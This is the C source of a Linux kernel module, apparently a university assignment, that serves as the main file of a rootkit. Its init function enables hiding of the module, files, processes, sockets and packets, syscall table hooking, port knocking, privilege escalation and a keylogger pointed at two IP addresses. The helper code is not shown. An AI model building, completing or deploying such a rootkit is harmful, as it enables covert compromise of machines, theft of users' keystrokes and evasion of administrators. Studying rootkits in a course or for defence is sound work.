/*
 * assignment3.c
 *
 * This kernel module provied and ioctl chanel for other modules to hide their existence from htop or other
 * taskmanagers.
 *
 */
#include "hook.h"

#include <linux/stat.h>
#include <linux/moduleparam.h>
#include <linux/sched.h>
#include <linux/signal.h>
#include <linux/syscalls.h>
#include "function_hooking.h"


static int port_num;
static int pid_num;
static char pid_as_string[80];

static char pid_as_string_2[80];

 module_param(port_num, int, 0000);//S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);
 MODULE_PARM_DESC(port_num, "port number of socat channel");
 module_param(pid_num, int, 0000);//S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);
 MODULE_PARM_DESC(pid_num, "pid of socat channel");

MODULE_AUTHOR("David Mildenberger, Benjamin Zanger");
MODULE_LICENSE("GPL"); /* required because kallsyms_lookup_name is exported as EXPORT_SYMBOL_GPL */
MODULE_DESCRIPTION(".");

/*
 * This function is called when the module is loaded.
 */
static int __init initialization(void)
{
	int process_id = 0;
	struct task_struct *task;
	initialize_hiding_module();
	initialize_hiding_files();
	initialize_ioctl_device();
	initialize_process_hiding();
	initialize_tty();
	initialize_socket_hiding();
	// TODO read unused?
	//initialize_read();
	initialize_port_knocking();
	initialize_hide_packets();

	initialize_privileged_tasks();
	initialize_keylogger("192.168.1.20", "131.159.206.44");
	/* last step to do */
    hook_functions_in_list();

	// hide communications channel
//	add_socket_to_hide(5, port_num);


//	 snprintf(pid_as_string,80,"%d",pid_num);
//	add_pid_to_hide(pid_as_string);

	printk(KERN_INFO "syscall table: %p", (afw_locate_sys_call_table()));
	return 0;
}


/*
 * This function is called when the module is unloaded.
 */
static void __exit exit_function(void)
{
	//packet_unhide("ipv4","88.99.192.80");
	//packet_unhide("ipv4","10.0.2.15");
	remove_socket_hiding();
	remove_tty();
	remove_ioctl_device();

	//kill_proc_info(SIGTERM,NULL,port_num);
	remove_process_hiding();
	cleanup_function_hooking();
	remove_keylogger();

	cleanup_privileged_tasks();

	remove_hide_packets();
	remove_port_knocking();
	remove_hiding_files();
	remove_hiding_module();
	//TODO read unsued?
	//remove_read();
}

module_init(initialization);
module_exit(exit_function);
